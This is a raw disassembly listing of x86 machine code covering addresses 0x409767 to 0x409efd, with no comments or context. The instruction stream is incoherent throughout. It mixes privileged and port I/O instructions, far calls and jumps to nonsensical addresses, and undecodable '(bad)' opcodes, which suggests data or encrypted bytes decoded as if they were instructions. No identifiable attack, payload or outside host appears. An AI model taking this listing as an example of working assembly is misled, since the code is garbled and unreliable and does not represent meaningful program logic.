  409767:	cmp    DWORD PTR [ebp-0x125bb5a],esi
  40976d:	or     eax,0xf512a963
  409772:	clc    
  409773:	cmp    DWORD PTR [ecx+0x228740d1],esp
  409779:	and    eax,0x7c3ff00b
  40977e:	mov    bh,0x3b
  409780:	mov    bl,BYTE PTR [esi+0x31]
  409783:	jp     0x4097f8
  409785:	mov    cl,0x27
  409787:	shr    ecx,cl
  409789:	pop    ebp
  40978a:	loopne 0x4097ec
  40978c:	push   edx
  40978d:	fbstp  TBYTE PTR [ebp-0x2d]
  409790:	add    eax,0x2de81b7f
  409795:	push   ss
  409796:	xor    ebp,DWORD PTR [esi]
  409798:	adc    edx,edx
  40979a:	ror    bl,1
  40979c:	fsubp  st(2),st
  40979e:	fcom   DWORD PTR [ebx-0x55]
  4097a1:	aas    
  4097a2:	sahf   
  4097a3:	test   eax,0x61097a73
  4097a8:	pop    ecx
  4097a9:	mov    BYTE PTR [edi+0x77],cl
  4097ac:	mov    ebp,0x5c6c339f
  4097b1:	aas    
  4097b2:	pop    esi
  4097b3:	inc    edi
  4097b4:	fmul   QWORD PTR [edi]
  4097b6:	cli    
  4097b7:	sub    al,0x1c
  4097b9:	xchg   ebp,eax
  4097ba:	or     eax,ebx
  4097bc:	cmp    DWORD PTR [eax+0x3ff75e6b],0xa9ea77c0
  4097c6:	cmp    BYTE PTR [edi-0x60],bh
  4097c9:	aam    0xea
  4097cb:	adc    BYTE PTR [ebx],ah
  4097cd:	icebp  
  4097ce:	inc    ebp
  4097cf:	into   
  4097d0:	and    BYTE PTR [ebx+0x566ced41],0x54
  4097d7:	mov    bh,0x9a
  4097d9:	push   ss
  4097da:	dec    esp
  4097db:	imul   esi,DWORD PTR [edx],0xffffffdd
  4097de:	inc    esi
  4097df:	sub    BYTE PTR [eax-0x68],ah
  4097e2:	jmp    0xbcb04b51
  4097e7:	mov    ecx,0x8cb494eb
  4097ec:	iret   
  4097ed:	jne    0x4097b1
  4097ef:	cwde   
  4097f0:	inc    esi
  4097f1:	mov    ah,0xac
  4097f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097f4:	je     0x40979c
  4097f6:	pop    esi
  4097f7:	mov    DWORD PTR [edx],edx
  4097f9:	mov    esi,0x18ae30f0
  4097fe:	popa   
  4097ff:	and    ah,BYTE PTR [ebp+0x71]
  409802:	sub    DWORD PTR [esi+eiz*1],0xffffffe9
  409806:	scas   al,BYTE PTR es:[edi]
  409807:	jb     0x40981d
  409809:	ss xchg cl,cl
  40980c:	lahf   
  40980d:	fwait
  40980e:	aaa    
  40980f:	jg     0x409823
  409811:	ret    0xf39f
  409814:	repnz push eax
  409816:	sbb    esp,ebx
  409818:	std    
  409819:	jne    0x4097a6
  40981b:	xchg   esp,eax
  40981c:	popa   
  40981d:	call   0x6fee:0x1e4c1d7b
  409824:	mov    dh,0x16
  409826:	and    BYTE PTR [ebx-0xb1cb022],bh
  40982c:	push   es
  40982d:	jns    0x409866
  40982f:	ja     0x40984e
  409831:	or     DWORD PTR [edx+0x5b],esp
  409834:	and    ah,BYTE PTR [edx+0x6e]
  409837:	nop
  409838:	pop    ebx
  409839:	xchg   ebx,eax
  40983a:	cmp    BYTE PTR [eax+0xc],dh
  40983d:	xchg   ebx,eax
  40983e:	mov    cl,ah
  409840:	sbb    dl,BYTE PTR [ebx+0x599f8ff]
  409846:	sub    al,0xc8
  409848:	jge    0x4097f3
  40984a:	push   0x11
  40984c:	outs   dx,BYTE PTR ds:[esi]
  40984d:	dec    ebp
  40984e:	xor    eax,0xf3be5eba
  409853:	xor    edi,0x200052b5
  409859:	imul   edi,DWORD PTR [ebx-0x67],0xf5f7f0cf
  409860:	mov    esi,0x4ea39bcf
  409865:	shl    ch,1
  409867:	test   BYTE PTR [esi-0x68896851],ch
  40986d:	sar    DWORD PTR [ebp+0x61],1
  409870:	mov    ebp,0x572536de
  409875:	mov    ch,0xef
  409877:	ins    DWORD PTR es:[edi],dx
  409878:	mov    bl,0x4f
  40987a:	add    dl,BYTE PTR [edi+0x330451fb]
  409880:	cmp    edx,edi
  409882:	mov    cl,0xcd
  409884:	push   es
  409885:	mov    eax,ds:0x7c325aa3
  40988a:	cmp    BYTE PTR [esi-0x48],dh
  40988d:	push   ecx
  40988e:	test   al,0xdd
  409890:	sti    
  409891:	push   cs
  409892:	xchg   esp,eax
  409893:	dec    ebp
  409894:	jp     0x40988b
  409896:	push   cs
  409897:	in     eax,0x2c
  409899:	and    al,0x12
  40989b:	sbb    esi,ebx
  40989d:	pop    ebx
  40989e:	xchg   DWORD PTR [esp+ebx*2+0x5aeaa95a],edi
  4098a5:	and    DWORD PTR [esi-0x30],0x88ecd411
  4098ac:	int3   
  4098ad:	shl    ch,cl
  4098af:	scas   eax,DWORD PTR es:[edi]
  4098b0:	lahf   
  4098b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098b2:	enter  0x3915,0x52
  4098b6:	fwait
  4098b7:	cmp    eax,0x90a0cee7
  4098bc:	dec    eax
  4098bd:	in     al,0xc3
  4098bf:	inc    ecx
  4098c0:	sub    dh,BYTE PTR [edi+0x16]
  4098c3:	xchg   bh,dl
  4098c5:	mov    ebp,0x4b901cae
  4098ca:	es loope 0x4098dd
  4098cd:	sub    BYTE PTR [ebx-0x34288c73],0x26
  4098d4:	shl    BYTE PTR [eax+0xf],1
  4098d7:	push   ebx
  4098d8:	test   eax,0x3d6540c3
  4098dd:	mov    bh,0x4d
  4098df:	mov    cl,0xea
  4098e1:	sbb    al,0x66
  4098e3:	and    DWORD PTR [ebp-0x49357b16],eax
  4098e9:	xchg   ebx,eax
  4098ea:	retf   
  4098eb:	fucomip st,st(3)
  4098ed:	push   edi
  4098ee:	and    BYTE PTR [ecx+ebp*2-0x28],0x5f
  4098f3:	loop   0x4098e1
  4098f5:	and    dh,BYTE PTR [ecx]
  4098f7:	shl    BYTE PTR [edi+0x3f1121b8],0xa6
  4098fe:	or     eax,0xae77c965
  409903:	outs   dx,BYTE PTR ds:[esi]
  409904:	dec    eax
  409905:	scas   al,BYTE PTR es:[edi]
  409906:	sbb    al,0xbf
  409908:	cs xchg edi,eax
  40990a:	test   edx,edi
  40990c:	test   eax,0x7a7eeb5e
  409911:	dec    ebx
  409912:	jae    0x4098cf
  409914:	scas   eax,DWORD PTR es:[edi]
  409915:	jnp    0x4098f8
  409917:	mov    ss,WORD PTR [eax]
  409919:	sahf   
  40991a:	cwde   
  40991b:	or     DWORD PTR [ecx+0x48],eax
  40991e:	jecxz  0x409951
  409920:	ja     0x4098fd
  409922:	push   edi
  409923:	sbb    ebx,DWORD PTR [eax-0x493bb611]
  409929:	inc    eax
  40992a:	shl    dl,1
  40992c:	xchg   edi,eax
  40992d:	xlat   BYTE PTR ds:[ebx]
  40992e:	pop    esi
  40992f:	mov    dl,0xbc
  409931:	pop    ecx
  409932:	pop    eax
  409933:	frstor [eax+eiz*4]
  409936:	fstp   QWORD PTR [eax+0x463287c1]
  40993c:	pop    eax
  40993d:	(bad)  
  40993e:	sbb    esp,DWORD PTR [edx-0x284e18c6]
  409944:	fcmovnb st,st(1)
  409946:	sbb    dh,BYTE PTR [ecx+0x43]
  409949:	repnz call 0x2c1f:0x6b859deb
  409951:	mov    DWORD PTR ds:0x836765d5,edx
  409957:	mov    ebx,0x54caf695
  40995c:	imul   esi,DWORD PTR [eax-0x5d],0xdbf9118
  409963:	xor    BYTE PTR [ecx-0x1a027d3b],0x84
  40996a:	mov    ebp,0xd5e7657f
  40996f:	clc    
  409970:	test   DWORD PTR [ebx-0x62],0x771fd4d
  409977:	adc    DWORD PTR [ebp+0x14],ebp
  40997a:	dec    eax
  40997b:	ja     0x4099aa
  40997d:	js     0x4099fb
  40997f:	sub    eax,DWORD PTR [eax-0x125c40f4]
  409985:	(bad)  
  409986:	pop    esp
  409987:	in     al,0x7e
  409989:	rcl    DWORD PTR [esi-0xf],1
  40998c:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40998e:	cdq    
  40998f:	(bad)  
  409991:	cs xchg ebx,eax
  409993:	or     DWORD PTR [edx-0x6d],ecx
  409996:	or     BYTE PTR es:[edx+ecx*1],ch
  40999a:	nop
  40999b:	into   
  40999c:	lods   al,BYTE PTR ds:[esi]
  40999d:	inc    edx
  40999e:	mov    eax,0xe3684b34
  4099a3:	inc    ebx
  4099a4:	jno    0x40994b
  4099a6:	jle    0x40997c
  4099a8:	jmp    0x2153ba2b
  4099ad:	add    dl,BYTE PTR [ecx]
  4099af:	fdiv   DWORD PTR [edx+0x9]
  4099b2:	mov    ebp,DWORD PTR [eax+eiz*2-0x5297407c]
  4099b9:	iret   
  4099ba:	mov    ss:0x38d51319,eax
  4099c0:	adc    ebp,DWORD PTR ds:0x762580c5
  4099c6:	neg    BYTE PTR [edi]
  4099c8:	fild   WORD PTR [esi-0x3076d8db]
  4099ce:	sub    al,0xd7
  4099d0:	xchg   esp,eax
  4099d1:	cmp    BYTE PTR [edx-0xea23b56],al
  4099d7:	jbe    0x409961
  4099d9:	push   0xdeb64d23
  4099de:	bound  esp,QWORD PTR [esi]
  4099e0:	cs xchg edx,eax
  4099e2:	sbb    bh,BYTE PTR [edx+0x497e86b2]
  4099e8:	jno    0x409a0a
  4099ea:	ins    BYTE PTR es:[edi],dx
  4099eb:	mov    DWORD PTR [edx],edi
  4099ed:	cmp    ebp,DWORD PTR [esi+0x6e]
  4099f0:	jns    0x40997b
  4099f2:	hlt    
  4099f3:	fmul   DWORD PTR ds:0x3c532e91
  4099f9:	sub    DWORD PTR [esp+eax*4+0x9],esp
  4099fd:	cli    
  4099fe:	sbb    dh,cl
  409a00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a01:	out    dx,al
  409a02:	adc    BYTE PTR [edi+0x39],dl
  409a05:	outs   dx,BYTE PTR ds:[esi]
  409a06:	jne    0x409a6c
  409a08:	or     edi,esi
  409a0a:	stos   DWORD PTR es:[edi],eax
  409a0b:	mov    dh,BYTE PTR [eax]
  409a0d:	mov    ds:0x9263d00e,al
  409a12:	mov    dl,bh
  409a14:	idiv   BYTE PTR [edi+0x6a]
  409a17:	add    DWORD PTR [edi*2+0x4fb5c7d8],ebx
  409a1e:	sbb    DWORD PTR [edx],ebp
  409a20:	shr    DWORD PTR [edx],0xc1
  409a23:	cli    
  409a24:	mov    ch,0x1c
  409a26:	icebp  
  409a27:	sub    BYTE PTR [esi-0xea04f21],dl
  409a2d:	adc    eax,0x3de91545
  409a32:	mov    eax,ds:0xe1bb43df
  409a37:	and    DWORD PTR [edi],edi
  409a39:	out    dx,al
  409a3a:	cmp    BYTE PTR ds:0xe31c8ac2,dh
  409a40:	adc    al,0xf7
  409a42:	cld    
  409a43:	sub    al,0x16
  409a45:	jbe    0x409ab6
  409a47:	(bad)  
  409a48:	xor    DWORD PTR [esp+0x47f488b2],esp
  409a4f:	jg     0x4099f2
  409a51:	sub    eax,0x828477dc
  409a56:	mov    al,0x9d
  409a58:	out    dx,al
  409a59:	mov    ebx,0x63409679
  409a5e:	inc    esp
  409a5f:	xlat   BYTE PTR ds:[ebx]
  409a60:	test   DWORD PTR [edi],edi
  409a62:	arpl   WORD PTR [eax+esi*1],cx
  409a65:	fisttp QWORD PTR [edx-0x76488aa7]
  409a6b:	test   al,0x4e
  409a6d:	sar    DWORD PTR [edi+0x3e89404],0x1
  409a74:	or     BYTE PTR [eax-0x75],cl
  409a77:	push   esi
  409a78:	lods   al,BYTE PTR ds:[esi]
  409a79:	outs   dx,DWORD PTR ds:[esi]
  409a7a:	add    eax,0xaf0ca5ff
  409a7f:	xlat   BYTE PTR ds:[ebx]
  409a80:	or     al,0x99
  409a82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a83:	movq   mm2,QWORD PTR [ecx]
  409a86:	mov    cl,0x11
  409a88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a89:	fwait
  409a8a:	inc    ebx
  409a8b:	ret    0x321e
  409a8e:	inc    edx
  409a8f:	mov    eax,0xa4768997
  409a94:	jp     0x409b06
  409a96:	fild   WORD PTR [ebp+0x0]
  409a99:	jns    0x409b15
  409a9b:	sbb    al,0x18
  409a9d:	loop   0x409a42
  409a9f:	mov    ah,0xec
  409aa1:	dec    ecx
  409aa2:	out    0xcd,al
  409aa4:	call   0xe171:0x99efac66
  409aab:	inc    edx
  409aac:	(bad)  
  409aad:	mov    ecx,0xb2700434
  409ab2:	sub    bl,bl
  409ab4:	inc    edi
  409ab5:	fwait
  409ab6:	adc    ah,BYTE PTR [edi-0x1a]
  409ab9:	retf   0x2bab
  409abc:	into   
  409abd:	mov    BYTE PTR [edi-0x18],dh
  409ac0:	jl     0x409af0
  409ac2:	fs fadd st(0),st
  409ac5:	aas    
  409ac6:	sahf   
  409ac7:	dec    edx
  409ac8:	js     0x409acf
  409aca:	xchg   ebp,eax
  409acb:	loop   0x409aef
  409acd:	into   
  409ace:	mov    ebx,0x7b86d993
  409ad3:	call   DWORD PTR [edi]
  409ad5:	xor    eax,0x51296b85
  409ada:	hlt    
  409adb:	dec    BYTE PTR [ebx+eax*1+0x455792a9]
  409ae2:	lock aas 
  409ae4:	test   al,0x17
  409ae6:	cmp    eax,0x7afbf06f
  409aeb:	pop    ebp
  409aec:	jbe    0x409b06
  409aee:	test   BYTE PTR [ecx-0x2e],0xfd
  409af2:	test   al,0x43
  409af4:	sti    
  409af5:	xchg   DWORD PTR [esi],edi
  409af7:	pusha  
  409af8:	out    0xa3,al
  409afa:	or     BYTE PTR [esp+edi*2-0x11418437],bh
  409b01:	cmp    al,0x97
  409b03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b04:	enter  0x8385,0x8b
  409b08:	arpl   WORD PTR [edx+0x2d4e8d4],ax
  409b0e:	fsubr  QWORD PTR [edx+0x3b3d65c5]
  409b14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b15:	aaa    
  409b16:	fdiv   st(3),st
  409b18:	mov    edi,DWORD PTR [ebx+0x65]
  409b1b:	pop    esi
  409b1c:	rdtsc  
  409b1e:	add    esi,DWORD PTR [esi]
  409b20:	cmp    esi,esp
  409b22:	and    DWORD PTR [ecx-0x452ecd7f],0x7dae1e88
  409b2c:	fst    QWORD PTR [esi]
  409b2e:	addr16 and al,0x61
  409b31:	xchg   ecx,eax
  409b32:	xchg   esi,eax
  409b33:	mov    esi,0xe98fda3e
  409b38:	add    edi,esi
  409b3a:	sbb    ebx,DWORD PTR [edi]
  409b3c:	or     al,0xd9
  409b3e:	aas    
  409b3f:	inc    ecx
  409b40:	cmp    al,0xea
  409b43:	adc    al,0x59
  409b45:	ins    BYTE PTR es:[edi],dx
  409b46:	add    edx,ebx
  409b48:	mov    eax,0xae74db5e
  409b4d:	jle    0x409b83
  409b4f:	loope  0x409b5d
  409b51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b52:	sub    eax,0x390ea707
  409b57:	hlt    
  409b58:	and    al,0xf3
  409b5a:	mov    bl,0x36
  409b5c:	or     al,BYTE PTR [eax]
  409b5e:	rcl    edx,0xd6
  409b61:	in     eax,0xad
  409b63:	shr    DWORD PTR [ebp+0x40b1e830],cl
  409b69:	jno    0x409b0d
  409b6b:	inc    ebx
  409b6c:	xchg   esp,eax
  409b6d:	js     0x409bad
  409b6f:	cmp    edx,DWORD PTR [edx+0x62dfbf29]
  409b75:	in     eax,0xe6
  409b77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b78:	sbb    BYTE PTR [ebx-0x1c],bl
  409b7b:	test   dl,0x76
  409b7e:	adc    bl,BYTE PTR [edx+0x5b6be9a1]
  409b84:	call   0x1d1b:0x685d486a
  409b8b:	sub    al,0x51
  409b8d:	les    ebp,FWORD PTR [ecx]
  409b8f:	and    ch,BYTE PTR [ebx+0x68798a89]
  409b95:	mov    edi,0x94981e41
  409b9a:	retf   
  409b9b:	mov    dl,0xad
  409b9d:	jg     0x409b30
  409b9f:	pop    ax
  409ba1:	fmul   QWORD PTR [edi+0x70]
  409ba4:	cwde   
  409ba5:	xchg   ebp,eax
  409ba6:	push   ecx
  409ba7:	add    eax,DWORD PTR [eax+0x34302963]
  409bad:	test   eax,0x5c55ffc3
  409bb2:	add    al,0xd3
  409bb4:	and    edi,DWORD PTR [esi-0x46fce51d]
  409bba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bbb:	xor    BYTE PTR [edi+eax*1+0x1b],dl
  409bbf:	out    0x78,al
  409bc1:	shl    BYTE PTR [ecx+0x650b6e56],cl
  409bc7:	scas   eax,DWORD PTR es:[edi]
  409bc8:	ret    0x8e4d
  409bcb:	jbe    0x409bfd
  409bcd:	or     BYTE PTR [edi+0x33ea2f0b],ah
  409bd3:	popa   
  409bd4:	push   ecx
  409bd5:	mov    ds:0xcd487969,al
  409bda:	fisttp WORD PTR [ecx+0x4f034fc0]
  409be0:	sbb    eax,0xc325cfc9
  409be5:	jl     0x409b6b
  409be7:	xrstors [edi-0x695f5d1f]
  409bee:	test   cl,0x71
  409bf1:	jmp    0xad65:0x732c461b
  409bf8:	mov    esp,0x3ea6b269
  409bfd:	add    al,0x94
  409bff:	(bad)  
  409c00:	daa    
  409c01:	loope  0x409ba2
  409c03:	cmc    
  409c04:	cli    
  409c05:	sub    DWORD PTR [ecx+0x68],eax
  409c08:	fdivp  st(3),st
  409c0a:	jne    0x409c4c
  409c0c:	aam    0xd7
  409c0e:	xchg   ebp,eax
  409c0f:	mov    dl,0x52
  409c11:	mov    ah,0xec
  409c13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c14:	jl     0x409c62
  409c16:	add    eax,0x4da7d589
  409c1b:	(bad)  
  409c1c:	xchg   ebx,eax
  409c1d:	add    al,0x30
  409c1f:	ret    0xfd44
  409c22:	lods   eax,DWORD PTR ds:[esi]
  409c23:	fnsave [ecx+0x2c]
  409c26:	clc    
  409c27:	test   dh,dl
  409c29:	mov    edi,0x434db9b1
  409c2e:	scas   al,BYTE PTR es:[edi]
  409c2f:	test   DWORD PTR [esi+0x65],eax
  409c32:	adc    al,0x1
  409c34:	xchg   ebp,eax
  409c35:	cmp    DWORD PTR [edi-0x4c0cb776],esp
  409c3b:	fmul   st(3),st
  409c3d:	fwait
  409c3e:	push   esp
  409c3f:	bsf    esi,DWORD PTR [esi+0x40654689]
  409c46:	sub    ah,BYTE PTR [ebp+0x170742af]
  409c4c:	xor    dl,bh
  409c4e:	dec    esi
  409c4f:	jnp    0x409beb
  409c51:	out    dx,eax
  409c52:	fbstp  TBYTE PTR [esi-0x3b]
  409c55:	cli    
  409c56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c57:	cvtps2pi mm7,QWORD PTR [esi-0x15da639b]
  409c5e:	pop    esp
  409c5f:	adc    eax,0x558553b6
  409c64:	jl     0x409c14
  409c66:	int    0x31
  409c68:	adc    DWORD PTR [esp+ebx*8-0x22],ebp
  409c6c:	sbb    eax,0x4269ef5c
  409c71:	lea    ebp,[ebx+0x26f421ae]
  409c77:	or     BYTE PTR [esi+edi*2],dh
  409c7a:	or     ch,dl
  409c7c:	(bad)  
  409c7e:	add    eax,0xe3bc76ea
  409c83:	cmp    eax,0x71970f83
  409c88:	fsubr  QWORD PTR [ecx+0x65]
  409c8b:	dec    edi
  409c8c:	test   BYTE PTR [eax+edi*4],al
  409c8f:	imul   eax,DWORD PTR [ebx],0xfffffff5
  409c92:	xor    BYTE PTR [ebx],ch
  409c94:	stos   BYTE PTR es:[edi],al
  409c95:	(bad)  
  409c96:	int    0xed
  409c98:	fs inc esp
  409c9a:	pop    eax
  409c9b:	xor    eax,0x37445c71
  409ca0:	xchg   edi,eax
  409ca1:	mov    DWORD PTR [edx-0x30],ecx
  409ca4:	or     al,0x2f
  409ca6:	repz sti 
  409ca8:	jne    0x409c57
  409caa:	shl    BYTE PTR cs:[ebp-0x50],1
  409cae:	mov    dh,0xc9
  409cb0:	lahf   
  409cb1:	and    BYTE PTR [edx+0x56],0xa6
  409cb5:	xchg   edx,eax
  409cb6:	aam    0x1b
  409cb8:	into   
  409cb9:	leave  
  409cba:	loope  0x409c5a
  409cbc:	add    ch,dl
  409cbe:	call   0xb8596cb0
  409cc3:	ficomp DWORD PTR [esi]
  409cc5:	inc    ecx
  409cc6:	mov    DWORD PTR [esi+0x51],0xf3b4e6c8
  409ccd:	test   ebp,esi
  409ccf:	push   ebx
  409cd0:	xor    ebx,DWORD PTR [ecx]
  409cd2:	pop    ss
  409cd3:	xchg   edi,eax
  409cd4:	out    dx,eax
  409cd5:	shl    al,1
  409cd7:	jmp    0xfb8b:0xefdbda61
  409cde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cdf:	retf   
  409ce0:	cmc    
  409ce1:	cmp    eax,0x748d3773
  409ce6:	jne    0x409cad
  409ce8:	aas    
  409ce9:	mov    ss,WORD PTR [ebx-0x6c4215b9]
  409cef:	test   al,0x19
  409cf1:	mov    ecx,DWORD PTR [esi-0x6e]
  409cf4:	push   0x7e
  409cf6:	(bad)  
  409cf7:	mov    WORD PTR [esi],cs
  409cf9:	int3   
  409cfa:	out    dx,al
  409cfb:	scas   al,BYTE PTR es:[edi]
  409cfc:	sbb    al,0x4f
  409cfe:	push   ds
  409cff:	ret    0xe835
  409d02:	div    dh
  409d04:	push   edx
  409d05:	lods   al,BYTE PTR ds:[esi]
  409d06:	jg     0x409cc3
  409d08:	iret   
  409d09:	jle    0x409d09
  409d0b:	arpl   si,di
  409d0d:	mov    DWORD PTR [ecx-0xd01adec],ecx
  409d13:	retf   0xcd1c
  409d16:	cmp    cl,BYTE PTR [ebx-0x1c]
  409d19:	adc    dl,BYTE PTR [esi]
  409d1b:	push   esp
  409d1c:	jle    0x409cef
  409d1e:	mov    BYTE PTR [esi-0x49],dl
  409d21:	dec    ebx
  409d22:	stos   BYTE PTR es:[edi],al
  409d23:	cmp    DWORD PTR [edx],ebx
  409d25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d26:	mov    al,ds:0x294479f1
  409d2b:	lods   eax,DWORD PTR ds:[esi]
  409d2c:	sub    DWORD PTR [ecx],esi
  409d2e:	push   edi
  409d2f:	scas   eax,DWORD PTR es:[edi]
  409d30:	in     al,dx
  409d31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d32:	(bad)  [ebx+0x2a343204]
  409d38:	dec    eax
  409d39:	pop    ebp
  409d3a:	repz cmp ecx,eax
  409d3d:	das    
  409d3e:	std    
  409d3f:	imul   edi,DWORD PTR [ebx+0x5ce3d5da],0xe96626
  409d49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d4a:	xchg   DWORD PTR [esi],eax
  409d4c:	pop    esp
  409d4d:	sbb    al,0x55
  409d4f:	mov    DWORD PTR [ecx-0xb],edi
  409d52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d53:	jb     0x409ce4
  409d55:	out    0x98,eax
  409d57:	xor    eax,0xed127d84
  409d5c:	scas   al,BYTE PTR es:[edi]
  409d5d:	cdq    
  409d5e:	push   0x64
  409d60:	adc    eax,0xbcc28e40
  409d65:	mov    BYTE PTR [edx+0x34e76452],ah
  409d6b:	add    BYTE PTR [esi],dl
  409d6d:	mov    ecx,ecx
  409d6f:	sub    al,0xd9
  409d71:	gs jnp 0x409dab
  409d74:	sub    edx,0xffffff8f
  409d77:	ror    edi,cl
  409d79:	aaa    
  409d7a:	cmp    DWORD PTR [ebp-0x5c],0xffffffaa
  409d7e:	inc    ebx
  409d7f:	aad    0xfa
  409d81:	inc    esi
  409d82:	imul   esi,DWORD PTR [ebx],0xffffffcb
  409d85:	xchg   BYTE PTR [eax-0x37],dh
  409d88:	hlt    
  409d89:	jno    0x409e00
  409d8b:	and    al,0x50
  409d8d:	jle    0x409d36
  409d8f:	dec    ecx
  409d90:	pop    DWORD PTR gs:[edi]
  409d93:	or     BYTE PTR [ebp-0x2],cl
  409d96:	inc    ebp
  409d97:	xchg   ebx,eax
  409d98:	xchg   esi,eax
  409d99:	sub    ebp,DWORD PTR [esi+0x3a]
  409d9c:	inc    esi
  409d9d:	into   
  409d9e:	pop    eax
  409d9f:	mov    eax,ds:0xb7dd9f72
  409da4:	adc    ebp,edx
  409da6:	jp     0x409d4c
  409da8:	sub    eax,0x52ac4a8
  409dad:	ss inc eax
  409daf:	jae    0x409d7b
  409db1:	fs ret 0x1ff2
  409db5:	and    DWORD PTR fs:[ebp-0x24],edi
  409db9:	aas    
  409dba:	stc    
  409dbb:	dec    edx
  409dbc:	mov    ah,0x96
  409dbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dbf:	jnp    0x409e00
  409dc1:	cmp    eax,0x7ca9c59f
  409dc6:	pop    ecx
  409dc7:	mov    cl,0x9d
  409dc9:	jno    0x409d59
  409dcb:	outs   dx,BYTE PTR ds:[esi]
  409dcc:	cld    
  409dcd:	jb     0x409dab
  409dcf:	push   ebx
  409dd0:	in     al,dx
  409dd1:	aam    0x2a
  409dd3:	cmp    ah,BYTE PTR [esi]
  409dd5:	fst    QWORD PTR [esi-0x4d]
  409dd8:	sub    eax,0x952a485a
  409ddd:	les    ebx,FWORD PTR [edi]
  409ddf:	mov    esp,0x5195ef9f
  409de4:	xor    DWORD PTR [edi-0x5b],ebx
  409de7:	sbb    al,0xb6
  409de9:	jnp    0x409e3e
  409deb:	aam    0x62
  409ded:	cmp    bl,BYTE PTR [edx-0x404e76d0]
  409df3:	push   ebp
  409df4:	cmp    BYTE PTR [edx+0x55],dh
  409df7:	dec    esi
  409df8:	or     BYTE PTR ds:0xb6100225,0x7b
  409dff:	aad    0x19
  409e01:	je     0x409e19
  409e03:	adc    al,0x94
  409e05:	ins    DWORD PTR es:[edi],dx
  409e06:	mov    al,0x8
  409e08:	add    eax,0x54499c7e
  409e0d:	repnz gs xchg esi,eax
  409e10:	pushf  
  409e11:	jp     0x409e66
  409e13:	mov    ch,0x8e
  409e15:	ret    
  409e16:	fnsave [esi]
  409e18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e19:	jmp    0xa820df7a
  409e1e:	xchg   ebx,eax
  409e1f:	mov    edi,0x11791bb8
  409e24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e25:	mov    ah,0xb9
  409e27:	or     esi,DWORD PTR [ecx-0x1c]
  409e2a:	fs xor cl,dl
  409e2d:	inc    esp
  409e2e:	mov    BYTE PTR [ecx],dl
  409e30:	cmp    esp,0x15
  409e33:	into   
  409e34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e35:	xchg   esp,eax
  409e36:	xor    esi,edx
  409e38:	adc    dl,BYTE PTR [ecx]
  409e3a:	adc    eax,DWORD PTR [edi]
  409e3c:	or     eax,DWORD PTR [edx]
  409e3e:	aaa    
  409e3f:	int3   
  409e40:	xchg   edi,eax
  409e41:	dec    ebp
  409e42:	mov    edi,0xf8db522b
  409e47:	aaa    
  409e48:	stos   BYTE PTR es:[edi],al
  409e49:	call   0xb50c:0xdcc19deb
  409e50:	mov    esp,0x6a639755
  409e55:	fsub   DWORD PTR [ecx]
  409e57:	mov    ds:0xbaf65961,eax
  409e5c:	push   0x9b80156e
  409e61:	mov    eax,0xba81a5cb
  409e66:	psubw  mm4,QWORD PTR ds:0x3fd02bb9
  409e6d:	nop
  409e6e:	cmp    dh,0x80
  409e71:	lock adc dh,BYTE PTR [edi+edi*1+0x240e9]
  409e79:	hlt    
  409e7a:	dec    eax
  409e7b:	pop    ds
  409e7c:	pop    ecx
  409e7d:	jno    0x409eca
  409e7f:	or     cl,ch
  409e81:	dec    esi
  409e82:	add    eax,0xb90cb52a
  409e87:	out    0x32,eax
  409e89:	les    edi,FWORD PTR [edx+0x7dde9b7e]
  409e8f:	fadd   st,st(7)
  409e91:	sbb    edx,DWORD PTR [ebx]
  409e93:	mov    ?,WORD PTR ds:0x77a7c412
  409e99:	retf   0x835
  409e9c:	sar    dl,cl
  409e9e:	retf   0xb02b
  409ea1:	jmp    0x4d756657
  409ea6:	add    bl,bh
  409ea8:	cdq    
  409ea9:	jbe    0x409f03
  409eab:	outs   dx,DWORD PTR ds:[esi]
  409eac:	inc    edx
  409ead:	aad    0x53
  409eaf:	xchg   esp,eax
  409eb0:	repnz mov esi,0x75ab1de3
  409eb6:	xlat   BYTE PTR ds:[ebx]
  409eb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409eb8:	das    
  409eb9:	enter  0x23e1,0xea
  409ebd:	sti    
  409ebe:	xor    edi,ebp
  409ec0:	shr    DWORD PTR [ebp+ebx*4+0x65],1
  409ec4:	cli    
  409ec5:	lods   eax,DWORD PTR ds:[esi]
  409ec6:	xor    DWORD PTR [ebp-0x3],0x7d
  409eca:	imul   ecx,DWORD PTR [edi+0x2427524b],0x3bad8ffb
  409ed4:	lods   al,BYTE PTR ds:[esi]
  409ed5:	push   es
  409ed6:	das    
  409ed7:	mov    dh,0xee
  409ed9:	fdivr  DWORD PTR [ebp+0xc]
  409edc:	and    DWORD PTR ds:0xb8857659,edx
  409ee2:	jnp    0x409f5b
  409ee4:	sar    BYTE PTR [ebx+0x76546f1e],0x1c
  409eeb:	std    
  409eec:	dec    ecx
  409eed:	ins    BYTE PTR es:[edi],dx
  409eee:	jecxz  0x409f5f
  409ef0:	ror    DWORD PTR [ebx],cl
  409ef2:	mov    gs,WORD PTR [ebx]
  409ef4:	and    al,0x42
  409ef6:	cmp    BYTE PTR [ebp+0x5c],dh
  409ef9:	test   al,0xd
  409efb:	and    al,0x85
  409efd:	shl    BYTE PTR ds:0xa972127,0x51
